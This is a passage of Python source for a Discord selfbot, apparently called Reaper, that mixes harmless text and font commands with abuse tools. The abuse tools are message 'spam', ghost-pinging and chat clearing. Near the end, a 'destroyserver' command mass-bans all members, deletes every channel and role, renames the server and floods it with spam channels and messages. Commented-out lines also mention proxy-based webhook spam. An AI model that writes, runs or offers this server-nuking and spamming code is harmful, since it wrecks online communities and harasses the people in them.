            title='Random Number Generator!',
            description=f'Min: `{num1}`\nMax: `{num2}`\n\nRandom Number is: `{random.randint(num1, num2)}`',
            colour=emcolor
        )
        embed.set_footer(text=footer)

        await ctx.message.delete()
        i = await ctx.send(embed=embed,delete_after=delinterval)
        cmdused('randomnum')

    @commands.command(aliases=['math_multiply', 'multiply'])
    async def math_multiply_cmd(self, ctx, arg5 : int, arg6 : int, n1 : int = '0', n2 : int = '0'):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        i = await ctx.channel.send(f"***Math!***\n{mfmultiply(arg5, arg6, n1, n2)}",delete_after=delinterval)
        cmdused('multiply')

    @commands.command(aliases=['math_divide', 'divide'])
    async def math_divide_cmd(self, ctx, arg7 : int, arg8 : int, n1 : int = '0', n2 : int = '0'):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        i = await ctx.channel.send(f"***Math!***\n{mfdivide(arg7, arg8, n1, n2)}",delete_after=delinterval)
        cmdused('divide')

    @commands.command(aliases=['math_add', 'add'])
    async def math_add_cmd(self, ctx, arg9 : int, arg10 : int, n1 : int = '0', n2 : int = '0'):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        i = await ctx.channel.send(f"***Math!***\n{mfadd(arg9, arg10, n1, n2)}",delete_after=delinterval)
        cmdused('add')

    @commands.command(aliases=['math_substract', 'substract'])
    async def math_substract_cmd(self, ctx, arg11 : int, arg12 : int, n1 : int = '0', n2 : int = '0'):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        i = await ctx.channel.send(f"***Math!***\n{mfsubstract(arg11, arg12, n1, n2)}",delete_after=delinterval)
        cmdused('substract')

    @commands.command(aliases=['math_square', 'square'])
    async def math_square_cmd(self, ctx, args : int, args2 : int):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        i = await ctx.channel.send(f"***Math!***\n{mfsquare(args, args2)}",delete_after=delinterval)
        cmdused('square')

class TextCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def lennyspiral(self, ctx):
        if await disableCmd(ctx) == 0: return
        try:
            await ctx.send("""   ‏‏‎  ‏‏‎( ͡° ͜ʖ ͡° )
     ( ( ͡° ͜ʖ ͡° )
    ( ͡° ( ͡° ͜ʖ ͡° )
   ( ͡° ͜ʖ ( ͡° ͜ʖ ͡° )
  ( ͡° ͜ʖ ͡° ( ͡° ͜ʖ ͡° )
 ( ͡° ͜ʖ ͡° ) ( ͡° ͜ʖ ͡° )
 ( ͡° ͜ʖ ͡° ) ( ͡° ͜ʖ ͡° )
  ( ͡° ͜ʖ ͡° ) ( ͡° ͜ʖ ͡° )
   ( ͡° ͜ʖ ͡° ) ͡° ͜ʖ ͡° )
    ( ͡° ͜ʖ ͡° ) ͜ʖ ͡° )
     ( ͡° ͜ʖ ͡° ) ͡° )
      ( ͡° ͜ʖ ͡° )° )
       ( ͡° ͜ʖ ͡° ))
        ( ͡° ͜ʖ ͡°)
      (( ͡° ͜ʖ ͡° )
     ( ( ͡° ͜ʖ ͡° )
    ( ͡° ( ͡° ͜ʖ ͡° )
   ( ͡° ͜ʖ ( ͡° ͜ʖ ͡° )
  ( ͡° ͜ʖ ͡° ( ͡° ͜ʖ ͡° )
 ( ͡° ͜ʖ ͡° ) ( ͡° ͜ʖ ͡° )
 ( ͡° ͜ʖ ͡° ) ( ͡° ͜ʖ ͡° )
  ( ͡° ͜ʖ ͡° ) ( ͡° ͜ʖ ͡° )
   ( ͡° ͜ʖ ͡° ) ͡° ͜ʖ ͡° )
    ( ͡° ͜ʖ ͡° ) ͜ʖ ͡° )
     ( ͡° ͜ʖ ͡° ) ͡° )
      ( ͡° ͜ʖ ͡° )° )
       ( ͡° ͜ʖ ͡° )
      ( ͡° ͜ʖ ͡° )
     ( ( ͡° ͜ʖ ͡° )
    ( ͡° ( ͡° ͜ʖ ͡° )
   ( ͡° ͜ʖ ( ͡° ͜ʖ ͡° )
  ( ͡° ͜ʖ ͡° ( ͡° ͜ʖ ͡° )
 ( ͡° ͜ʖ ͡° ) ( ͡° ͜ʖ ° )
 ( ° ʖ ° ) ( ° ʖ ° )
  ( ° ʖ ° ) ( ° ʖ ° )
   ( ° ʖ ° ) ° ʖ ° )
    ( ° ʖ ° ) ʖ ° )
     ( ° ʖ ° ) ° )
      ( ° ʖ ° )° )
       ( ° ʖ ° ))
        ( ° ʖ °)
      ( ( ° ʖ ° )
     ( ( ° ʖ ° )
    ( ° ( ° ʖ ° )
   ( ° ʖ ( ° ʖ ° )
  ( ° ʖ ° ( ° ʖ ° )
 ( ° ʖ ° ) ( ° ʖ ° )
 ( ° ʖ ° ) ( ° ʖ ° )
  ( ° ʖ ° ) ( ° ʖ ° )
   ( ° ʖ ° ) ° ʖ ° )
    ( ° ʖ ° ) ʖ ° )
     ( ° ʖ ° ) ° )
      ( ° ʖ ° )° )
       ( ° ʖ ° )""")
        except:
            pass
        cmdused("lennyspiral")

    @commands.command(pass_context=True)
    async def markdown(self, ctx, *, msg):
        if await disableCmd(ctx) == 0: return
        """Write text in markdown format."""
        await ctx.message.delete()
        await ctx.send("```" + msg.replace("`", "") + "```")
        cmdused("markdown")

    @commands.command()
    async def textgif(self, ctx, *, args):
        if await disableCmd(ctx) == 0: return
        try:
            os.mkdir("assets")
        except:
            pass
        img = Image.new("RGB", (500, 45), "black")
        d = ImageDraw.Draw(img)
        c = 0
        font = ImageFont.truetype("./assets/Tabitha.ttf", 27)
        for m in range(len(args)):
            x = 9
            d.text((x + c, 5), args[m], fill=(255, 255, 255), font=font)
            img.save(f"./assets/{m}.png")
            c += 13
        file_list = glob.glob("./assets/*.png")
        list.sort(file_list)
        import moviepy.editor as mpy
        clip = mpy.ImageSequenceClip(file_list, fps=10)
        clip.write_gif("./assets/content.gif", fps=10)
        await ctx.send(file=discord.File("./assets/content.gif"))
        await ctx.message.delete()
        for f in glob.glob("./assets/*.png"):
            os.remove(f)
        cmdused("textgif")
        del mpy

    @commands.command(name="useless-fact", aliases=["uselessfact", "fact", "randomfact", "random-fact"])
    async def _useless_fact(self, ctx, *, lang = "en"):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        if lang not in ["en", "de"]:
            return await ctx.send("Available languages: `de`, `en`.", delete_after=delinterval)
        else:
            r = requests.get("https://uselessfacts.jsph.pl/random.json?language="+lang)
            res = r.json()
            fact = res["text"]
            await ctx.send("**Fact:** "+fact)
        cmdused("useless-fact")

    @commands.command(aliases=['covidstats', 'covid-stats'])
    async def covid19(self, ctx, *, country: str = "Global"):
        if await disableCmd(ctx) == 0: return
        if country == "Global":
            url = "https://covid19.mathdro.id/api"
        else:
            if len(country) < 4:
                country = country.upper()
            else:
                country = country.title()
            url = "https://covid19.mathdro.id/api/countries/{s}".format(c=country)
        try:
            await ctx.message.delete()
            res = requests.get(url)
            res = res.json()
            if "error" in str(res):
                er = res["error"]["message"]
                await ctx.send(f"{er}", delete_after=delinterval)
            else:
                emb = discord.Embed(
                    color=emcolor, 
                    timestamp=datetime.utcnow()
                )\
                    .set_author(name=country+" Covid Stats", icon_url=emimage)\
                    .set_thumbnail(url="https://cdn.discordapp.com/attachments/802533173535178752/805120209962795038/043940800_1581138377-20200208-Virus-Corona-Ancam-Kesehatan-Dunia-1.png")\
                    .add_field(name="Total Confirmed", value=str(res["confirmed"]["value"]))\
                    .add_field(name="Total Recovered", value=str(res["recovered"]["value"]))\
                    .add_field(name="Total Deaths", value=str(res["deaths"]["value"]))\
                    .set_footer(text=footer)
                await ctx.send(embed=emb, delete_after=delinterval)
        except Exception as e:
            print(e)
        cmdused('covid-stats')

    @commands.command()
    async def spam(self, ctx, amount : int, *, msg):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        for i in range(amount):
            await ctx.send(msg)
            await asyncio.sleep(0.2)

    @commands.command(aliases=['ghostping'])
    async def gping(self, ctx, args, *, amount : int = 1):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        a = amount
        while a != 0:
            i = await ctx.send(f"{args}")
            a = a - 1
            await asyncio.sleep(0.2)
            await i.delete()
            await asyncio.sleep(0.3)

    @commands.command()
    async def shrug(ctx, *, msg = "_ _"): 
        await ctx.message.delete()
        l='¯\_(ツ)_/¯'
        await ctx.send(msg+" "+l)
        cmdused('shrug')

    @commands.command()
    async def lenny(ctx, *, msg = "_ _"): 
        await ctx.message.delete()
        l = '( ͡° ͜ʖ ͡°)'
        await ctx.send(msg+" "+l)
        cmdused('lenny')

    @commands.command()
    async def tableflip(self, ctx): 
        await ctx.message.delete()
        tableflip = '(╯°□°）╯︵ ┻━┻'
        await ctx.send(tableflip)
        cmdused(tableflip)

    @commands.command()
    async def unflip(self, ctx): 
        await ctx.message.delete()
        unflip = '┬─┬ ノ( ゜-゜ノ)'
        await ctx.send(unflip)
        cmdused(unflip)

    @commands.command()
    async def reverse(self, ctx, *, message): 
        await ctx.message.delete()
        message = message[::-1]
        await ctx.send(message)
        cmdused('reverse')

    @commands.command()
    async def upper(self, ctx, *, message): 
        await ctx.message.delete()
        message = message.upper()
        await ctx.send(message)
        cmdused('upper')

    @commands.command()
    async def lower(self, ctx, *, message): 
        await ctx.message.delete()
        message = message.lower()
        await ctx.send(message)
        cmdused('lower')

    @commands.command(aliases=['dvwl'])
    async def devowel(self, ctx, *, text):  
        await ctx.message.delete()
        dvl = text.replace('a', '').replace('A', '').replace('e', '')\
                .replace('E', '').replace('i', '').replace('I', '')\
                .replace('o', '').replace('O', '').replace('u', '').replace('U', '')
        await ctx.send(dvl)
        cmdused('devowel')

    @commands.command(aliases=['claptalk'])
    async def clap(self, ctx, *, message):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        await ctx.send(' 👏 '.join(message.split(' ')))
        cmdused('clap')

    @commands.command(aliases=['leetspeak','1337speak', '1337'])
    async def _1337_speak(self, ctx, *, text):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        text = text.replace('a', '4').replace('A', '4').replace('e', '3') \
            .replace('E', '3').replace('i', '!').replace('I', '!') \
            .replace('o', '0').replace('O', '0')
        await ctx.send(f'{text}')
        cmdused('1337speak')

    @commands.command()
    async def purge(self, ctx, amount: int):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == reaper.user).map(lambda m: m):
            try:
                await message.delete()
                await asyncio.sleep(0.18)
            except:
                pass
        cmdused('purge')
    
    @commands.command()
    async def purgeall(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        async for message in ctx.message.channel.history(limit=1000).filter(lambda m: m.author == reaper.user).map(lambda m: m):
            try:
                await message.delete()
                await asyncio.sleep(0.18)
            except:
                pass

        cmdused('purgeall')

    @commands.command(aliases=['plusencode', 'sbpencode','encode+'])
    async def sbplusencode(self, ctx, *, args):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        i = args.encode('ascii')
        b = base64.b32encode(i)
        b32 = b.decode('ascii')
        v = b32.encode('ascii')
        c = base64.b64encode(v)
        bfinal = c.decode('ascii')
        await ctx.send(bfinal)
        cmdused('encode+')

    @commands.command(aliases=['plusdecode', 'sbpdecode','decode+'])
    async def sbplusdecode(self, ctx, *, args):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        i = args.encode('ascii')
        b = base64.b64decode(i)
        b32 = b.decode('ascii')
        v = b32.encode('ascii')
        c = base64.b32decode(v)
        bfinal = c.decode('ascii')
        await ctx.send(bfinal)
        cmdused('decode+')

    @commands.command(pass_context=True, aliases=['regional'])
    async def bigtext(self, ctx, *, msg):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        msg = list(msg)
        regional_list = [regionals[x.lower()] if x.isalnum() or x in ["!", "?"] else x for x in msg]
        regional_output = ' '.join(regional_list) #\u200b alternative for space
        await ctx.send(regional_output)
        cmdused('bigtext')

    @commands.command()
    async def embed(self, ctx, *, args):
        if await disableCmd(ctx) == 0: return
        argsplit = args.split("|")
        if "|" in ctx.message.content:
            title = argsplit[0]
            desc = argsplit[1]
            embed = discord.Embed(
                title=title,  description=desc, colour=emcolor)
        else:
            title=args
            embed = discord.Embed(title=title, colour=emcolor)
        await ctx.message.delete()
        i = await ctx.send(embed=embed,delete_after=delinterval)
        cmdused('embed')

    @commands.command()
    async def ascii(self, ctx, *, args):
        if await disableCmd(ctx) == 0: return
        try:
            await ctx.message.delete()
            res = "\n".join(requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(args)}').text.split('\n')[0:8])
            await ctx.send(f"```\n{res}```")
            cmdused('ascii')
        except Exception as e:
            print(e)

    @commands.command()
    async def rbembed(self, ctx, *, args):
        if await disableCmd(ctx) == 0: return
        cmdused("rbembed")
        if "|" in args:
            argsplit = args.split("|")
            title = argsplit[0]
            desc = argsplit[1]
            enbs = [
                discord.Embed(title=title,description=desc,colour=discord.Color.red()),
                discord.Embed(title=title,description=desc,colour=discord.Color.orange()),
                discord.Embed(title=title,description=desc,colour=discord.Color.gold()),
                discord.Embed(title=title,description=desc,colour=discord.Color.green()),
                discord.Embed(title=title,description=desc,colour=discord.Color.teal()),
                discord.Embed(title=title,description=desc,colour=discord.Color.blue()),
                discord.Embed(title=title,description=desc,colour=discord.Color.magenta()),
                discord.Embed(title=title,description=desc,colour=discord.Color.purple()),
            ]
        else:
            title=args
            enbs = [
                discord.Embed(title=title,colour=discord.Color.red()),
                discord.Embed(title=title,colour=discord.Color.orange()),
                discord.Embed(title=title,colour=discord.Color.gold()),
                discord.Embed(title=title,colour=discord.Color.green()),
                discord.Embed(title=title,colour=discord.Color.teal()),
                discord.Embed(title=title,colour=discord.Color.blue()),
                discord.Embed(title=title,colour=discord.Color.magenta()),
                discord.Embed(title=title,colour=discord.Color.purple()),
            ]
        try:
            await ctx.message.delete()
            l = await ctx.send("_ _", embed=random.choice(enbs).set_footer(text=footer), delete_after=delinterval * 2)
            sleep(2)
            for i in range(300):
                for en in enbs:
                    await l.edit(content="", embed=en.set_footer(text=footer))
                    sleep(2)
        except:
            pass

    @commands.command()
    async def textflip(self, ctx, *, msg):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        result = ""
        for char in msg:
            if char in text_flip:
                result += text_flip[char]
            else:
                result += char
        await ctx.send(result[::- 1])
        cmdused('textflip')

    @commands.command()
    async def spacetext(self, ctx, *, msg):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        if msg.split(' ', 1)[0].isdigit():
            spaces = int(msg.split(' ', 1)[0]) * ' '
            msg = msg.split(' ', 1)[1].strip()
        else:
            spaces = '  '
        spaced_message = spaces.join(list(msg))
        await ctx.send(spaced_message)
        cmdused('spacetext')

    @commands.command()
    async def encode(self, ctx, *, args):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        i = args.encode('ascii')
        b = base64.b64encode(i)
        b64 = b.decode('ascii')
        await ctx.send(b64)
        cmdused('encode')

    @commands.command()
    async def decode(self, ctx, *, args):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        i = args.encode('ascii')
        b = base64.b64decode(i)
        b64 = b.decode('ascii')
        await ctx.send(b64)
        cmdused('decode')

    @commands.command()
    async def clearchat(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        for i in range(3):
            i = i
            await ctx.send('ﾠﾠ' + '\n' * 400 + 'ﾠﾠ')
            await asyncio.sleep(0.2)
        cmdused('clearchat')

class FancyFont(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.normal = "!#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
        self.smallcaps = "!#$%&'()*+,-./𝟶𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿:;<=>?@ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘϙʀᴤᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘϙʀᴤᴛᴜᴠᴡxʏᴢ"
        self.fancyfont1 = "!#$%&'()*+,-./𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗:;<=>?@𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳"
        self.fancyfont2 = "!#$%&'()*+,-./0123456789:;<=>?@𝘼𝘽𝘾𝘿𝙀𝙁𝙂𝙃𝙄𝙅𝙆𝙇𝙈𝙉𝙊𝙋𝙌𝙍𝙎𝙏𝙐𝙑𝙒𝙓𝙔𝙕𝙖𝙗𝙘𝙙𝙚𝙛𝙜𝙝𝙞𝙟𝙠𝙡𝙢𝙣𝙤𝙥𝙦𝙧𝙨𝙩𝙪𝙫𝙬𝙭𝙮𝙯"
        self.fancyfont3 = "!#$%&'()*+,-./0123456789:;<=>?@𝓐𝓑𝓒𝓓𝓔𝓕𝓖𝓗𝓘𝓙𝓚𝓛𝓜𝓝𝓞𝓟𝓠𝓡𝓢𝓣𝓤𝓥𝓦𝓧𝓨𝓩𝓪𝓫𝓬𝓭𝓮𝓯𝓰𝓱𝓲𝓳𝓴𝓵𝓶𝓷𝓸𝓹𝓺𝓻𝓼𝓽𝓾𝓿𝔀𝔁𝔂𝔃"
        self.fancyfont4 = "!#$%&'()*+,-./𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡:;<=>?@𝔸𝔹ℂ𝔻𝔼𝔽𝔾ℍ𝕀𝕁𝕂𝕃𝕄ℕ𝕆ℙℚℝ𝕊𝕋𝕌𝕍𝕎𝕏𝕐ℤ𝕒𝕓𝕔𝕕𝕖𝕗𝕘𝕙𝕚𝕛𝕜𝕝𝕞𝕟𝕠𝕡𝕢𝕣𝕤𝕥𝕦𝕧𝕨𝕩𝕪𝕫"
        self.fancyfont5 = "！＃＄％＆＇（）＊＋，－．／０１２３４５６７８９：；＜＝＞？＠ＡＢＣＤＥＦＧＨＩＪＫＬＭＮＯＰＱＲＳＴＵＶＷＸＹＺａｂｃｄｅｆｇｈｉｊｋｌｍｎｏｐｑｒｓｔｕｖｗｘｙｚ"
        self.bubbletext = "!#$%&'()*+,-./⓿➊➋➌➍➎➏➐➑➒:;<=>?@🅐🅑🅒🅓🅔🅕🅖🅗🅘🅙🅚🅛🅜🅝🅞🅟🅠🅡🅢🅣🅤🅥🅦🅧🅨🅩🅐🅑🅒🅓🅔🅕🅖🅗🅘🅙🅚🅛🅜🅝🅞🅟🅠🅡🅢🅣🅤🅥🅦🅧🅨🅩"
        self.cmd = lambda m: cmdused(m.message.content.split(prefix)[1].split()[0])

    def changefont(self, m: str, f):
        tempor = {}
        for idx, char in enumerate(self.normal):
            tempor[char] = f[idx]
            tempor[f[idx]] = char
        res = ""
        for char in m:
            if char in tempor:
                res += tempor[char]
            else:
                res += char
        return res
        n = m.replace("!", f[0])\
            .replace("#", f[1])\
            .replace("$", f[2])\
            .replace("%", f[3])\
            .replace("&", f[4])\
            .replace("'", f[5])\
            .replace("(", f[6])\
            .replace(")", f[7])\
            .replace("*", f[8])\
            .replace("+", f[9])\
            .replace(",", f[10])\
            .replace("-", f[11])\
            .replace(".", f[12])\
            .replace("/", f[13])\
            .replace("0", f[14])\
            .replace("1", f[15])\
            .replace("2", f[16])\
            .replace("3", f[17])\
            .replace("4", f[18])\
            .replace("5", f[19])\
            .replace("6", f[20])\
            .replace("7", f[20])\
            .replace("8", f[21])\
            .replace("9", f[22])\
            .replace(":", f[23])\
            .replace(";", f[24])\
            .replace("<", f[25])\
            .replace("=", f[26])\
            .replace(">", f[27])\
            .replace("?", f[28])\
            .replace("@", f[29])\
            .replace("A", f[30])\
            .replace("B", f[31])\
            .replace("C", f[32])\
            .replace("D", f[33])\
            .replace("E", f[34])\
            .replace("F", f[35])\
            .replace("G", f[36])\
            .replace("H", f[37])\
            .replace("I", f[38])\
            .replace("J", f[39])\
            .replace("K", f[40])\
            .replace("L", f[41])\
            .replace("M", f[42])\
            .replace("N", f[43])\
            .replace("O", f[44])\
            .replace("P", f[45])\
            .replace("Q", f[46])\
            .replace("R", f[47])\
            .replace("S", f[48])\
            .replace("T", f[49])\
            .replace("U", f[50])\
            .replace("V", f[51])\
            .replace("W", f[52])\
            .replace("X", f[53])\
            .replace("Y", f[54])\
            .replace("Z", f[55])\
            .replace("a", f[56])\
            .replace("b", f[57])\
            .replace("c", f[58])\
            .replace("d", f[59])\
            .replace("e", f[60])\
            .replace("f", f[61])\
            .replace("g", f[62])\
            .replace("h", f[63])\
            .replace("i", f[64])\
            .replace("j", f[65])\
            .replace("k", f[66])\
            .replace("l", f[67])\
            .replace("m", f[68])\
            .replace("n", f[69])\
            .replace("o", f[70])\
            .replace("p", f[71])\
            .replace("q", f[72])\
            .replace("r", f[73])\
            .replace("s", f[74])\
            .replace("t", f[75])\
            .replace("u", f[76])\
            .replace("v", f[77])\
            .replace("w", f[78])\
            .replace("x", f[79])\
            .replace("y", f[80])\
            .replace("z", f[81])

    @commands.command()
    async def fancytext(self, ctx):
        if await disableCmd(ctx) == 0: return
        try:
            await ctx.send(embed=discord.Embed(
                color=emcolor,
                timestamp=datetime.utcnow(),
                description=f'''**`{prefix}smallcaps [text]`**\nMakes the caps small like ᴛʜɪs sᴏʀᴛ ᴏғ ᴛᴇxᴛ
                **`{prefix}bubbletext [text]`**\nBubbles text be like 🅑🅤🅑🅑🅛🅔 🅣🅔🅧🅣
                **`{prefix}reverse [text]`**\nReverses the text to something siht ekil (like this)
                **`{prefix}textflip [text]`**\nFlips the text uʍop Ǝp˥SԀ∩ (upside down)
                **`{prefix}bigtext [text]`**\nFormats text with regional indicator
                **`{prefix}ascii [text]`**\nFormats a text in ascii font
                **`{prefix}fancy1 [text]`**\nMakes text fancy like 𝐭𝐡𝐢𝐬 𝐭𝐞𝐱𝐭
                **`{prefix}fancy2 [text]`**\nMakes text fancy like 𝙩𝙝𝙞𝙨 𝙩𝙚𝙭𝙩
                **`{prefix}fancy3 [text]`**\nMakes text fancy like 𝓽𝓱𝓲𝓼 𝓽𝓮𝔁𝓽
                **`{prefix}fancy4 [text]`**\nMakes text fancy like 𝕥𝕙𝕚𝕤 𝕥𝕖𝕩𝕥
                **`{prefix}fancy5 [text]`**\nMakes text fancy like ｔｈｉｓ ｔｅｘｔ''')\
                .set_footer(text=footer)\
                .set_author(
                name="Reaper Fancy Text Commands",
                icon_url=emimage)\
                .set_thumbnail(url=emimage)\
                .set_image(url=emimagealt)
                ,delete_after=delinterval)
        except:
            pass
        await ctx.message.delete()
        cmdused("fancytext")

    @commands.command()
    async def smallcaps(self, ctx, *, msg):
        if await disableCmd(ctx) == 0: return
        try:
            font = self.smallcaps
            await ctx.message.delete()
            result = f"{self.changefont(msg, font)}"
            await ctx.send(result)
        except Exception as e:
            print(e)
        self.cmd(ctx)

    @commands.command()
    async def fancy1(self, ctx, *, msg):
        if await disableCmd(ctx) == 0: return
        font = self.smallcaps
        await ctx.message.delete()
        result = f"{self.changefont(msg, font)}"
        await ctx.send(result)
        self.cmd(ctx)

    @commands.command()
    async def fancy1(self, ctx, *, msg):
        if await disableCmd(ctx) == 0: return
        font = self.fancyfont1
        await ctx.message.delete()
        result = f"{self.changefont(msg, font)}"
        await ctx.send(result)
        self.cmd(ctx)

    @commands.command()
    async def fancy2(self, ctx, *, msg):
        if await disableCmd(ctx) == 0: return
        font = self.fancyfont2
        await ctx.message.delete()
        result = f"{self.changefont(msg, font)}"
        await ctx.send(result)
        self.cmd(ctx)

    @commands.command()
    async def fancy3(self, ctx, *, msg):
        if await disableCmd(ctx) == 0: return
        font = self.fancyfont3
        await ctx.message.delete()
        result = f"{self.changefont(msg, font)}"
        await ctx.send(result)
        self.cmd(ctx)

    @commands.command()
    async def fancy4(self, ctx, *, msg):
        if await disableCmd(ctx) == 0: return
        font = self.fancyfont4
        await ctx.message.delete()
        result = f"{self.changefont(msg, font)}"
        await ctx.send(result)
        self.cmd(ctx)

    @commands.command()
    async def fancy5(self, ctx, *, msg):
        if await disableCmd(ctx) == 0: return
        font = self.fancyfont5
        await ctx.message.delete()
        result = f"{self.changefont(msg, font)}"
        await ctx.send(result)
        self.cmd(ctx)

    @commands.command()
    async def bubbletext(self, ctx, *, msg):
        if await disableCmd(ctx) == 0: return
        font = self.bubbletext
        await ctx.message.delete()
        result = f"{self.changefont(msg, font)}"
        await ctx.send(result)
        self.cmd(ctx)

class DestroyServer(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.config = config["DestroyServer"]
        self.options = self.config["Options"]
        self.massban = self.options["MassBan"]
        self.printlog = lambda m: print(s.space+s.sblue+m)

        self.modifyserver = self.options["ModifyServerOptions"]
        self.modifyserveren = self.options["ModifyServer"]
        self.servername = self.modifyserver["ServerName"]
        self.serverdesc = self.modifyserver["Description"]
        self.serverreason = self.modifyserver["Reason"]

        self.spamchannels = self.options["SpamChannelsOptions"]
        self.spch = self.spamchannels
        self.spamchannelsen = self.options["SpamChannels"]
        self.delchannels = self.options["DelChannels"]
        self.channelnames = list(self.spamchannels["Names"])
        self.tcspam = bool (self.spamchannels["TextChannels"])
        self.vcspam = bool (self.spamchannels["VoiceChannels"])
        self.ctspam = bool (self.spamchannels["CategoryChannels"])
        self.createchannelsamount = self.spamchannels["Amount"]
        self.spaminf = bool (self.spch["SpamIndefinitely"])
        self.messagessn = self.spamchannels["Messages"]
        self.sendmsgs = self.spamchannels["SendMessages"]
        self.tcspam: bool
        self.vcspam: bool
        self.ctspam: bool
        self.spaminf: bool
        self.sendmsgs: bool
        self.messagessn: list

        self.spamroles = self.options["SpamRolesOptions"]
        self.spamrolesamount = int (self.spamroles["Amount"])
        self.spamrolesen = bool (self.options["SpamRoles"])
        self.rolesnames = list (self.spamroles["Names"])
        self.rolesrandomcol = bool (self.spamroles["RandomColors"])
        self.delroles = self.options["DelRoles"]

        #self.webhookspam = self.options["WebhookSpamOptions"]
        #self.webhookspamen = self.options["WebhookSpam"]
        #self.webhookname = config["DestroyServer"]["Options"]["WebhookSpamOptions"]["BotName"]
        #self.webhookavatar = self.webhookspam["Avatar"]
        #self.socks4 = open(self.webhookspam["Socks4ProxyFile"], "r").readlines()
        #self.webhookspamamount = self.webhookspam["AmountPerChannel"]
        #self.webhookmessages = list(self.webhookspam["Messages"])

    @commands.command()
    async def destroyserver(self, ctx):
        if await disableCmd(ctx) == 0: return
        try:
            await ctx.message.delete()
        except:
            pass

        m = await ctx.send("Are you sure to nuke this server?\nIf yes, type `yes`")
        try:
            def checkdata(message): return message.author == ctx.message.author
            msg = await self.bot.wait_for('message', check=checkdata, timeout=15)
            msc = lambda m: (msg.content == m)
            if msc("yes") or msc("y"):

                await m.delete()

                if self.massban == True:
                    for user in list(ctx.guild.members):
                        try:
                            await user.ban()
                            print(s.space+s.yellow+f"Banned the user \"{user}\"")
                        except:
                            pass

                if self.delchannels == True:
                    for channel in list(ctx.guild.channels):
                        try:
                            await channel.delete()
                            print(s.space+s.red+f"Deleted the channel \"{channel}\"")
                        except:
                            pass

                if self.delroles == True:
                    for role in list(ctx.guild.roles):
                        try:
                            await role.delete()
                            print(s.space+s.red+f"Deleted the role \"{role}\"")
                        except:
                            pass

                if self.modifyserveren == True:
                    try:
                        await ctx.guild.edit(
                            name=self.servername,
                            description=self.serverdesc,
                            reason=self.serverreason,
                            icon=None,
                            banner=None)
                        print(s.space+s.green+f"Modified the server")
                    except:
                        pass
                
                if self.spamchannelsen == True:
                    if self.spaminf:
                        try:
                            amt = round (self.createchannelsamount)
                            names = list (self.channelnames)
                            async def _spamch():
                                for i in range(amt):
                                    try:
                                        if self.tcspam == True:
                                            try:
                                                name = random.choice(names)
                                                tchannel = await ctx.guild.create_text_channel(name=name)
                                                self.printlog(f"Created a text channel \"#{tchannel}\"")
                                                if self.sendmsgs == True:
                                                    try:
                                                        for m in self.messagessn:
                                                            await tchannel.send(f"{m}")
                                                        end()
                                                    except Exception as e:
                                                        print(e)
                                                        continue
                                                    end()
                                            except Exception as e:
                                                print(e)
                                                continue
                                        if self.vcspam == True:
                                            try:
                                                name = random.choice(names)
                                                cc = await ctx.guild.create_voice_channel(name=f'{name}')
                                                self.printlog(f"Created a voice channel \"{cc}\"")
                                            except Exception as e:
                                                print(e)
                                                continue
                                        if self.ctspam == True:
                                            try:
                                                name = random.choice(names)
                                                cc = await ctx.guild.create_category(name=f'{name}')
                                                self.printlog(f"Created a category channel \"{cc}\"")
                                            except Exception as e:
                                                print(e)
                                                continue
                                    except Exception as e:
                                        print(e)
                                        continue
                                    print(s.space+s.sblue+f"Created channels!")
                            loop_spamch = asyncio.get_event_loop()
                            loop_spamch.create_task(_spamch())
                            loop_spamch.run_forever()

                            async def _spamch_():
                                for i in range(amt):
                                    try:
                                        if self.tcspam == True:
                                            try:
                                                name = random.choice(names)
                                                tchannel = await ctx.guild.create_text_channel(name=name)
                                                self.printlog(f"Created a text channel \"#{tchannel}\"")
                                                if self.sendmsgs == True:
                                                    try:
                                                        for m in self.messagessn:
                                                            await tchannel.send(f"{m}")
                                                        end()
                                                    except Exception as e:
                                                        print(e)
                                                        continue
                                                    end()
                                            except Exception as e:
                                                print(e)
                                                continue
                                        if self.vcspam == True:
                                            try:
                                                name = random.choice(names)
                                                cc = await ctx.guild.create_voice_channel(name=f'{name}')
                                                self.printlog(f"Created a voice channel \"{cc}\"")
                                            except Exception as e:
                                                print(e)
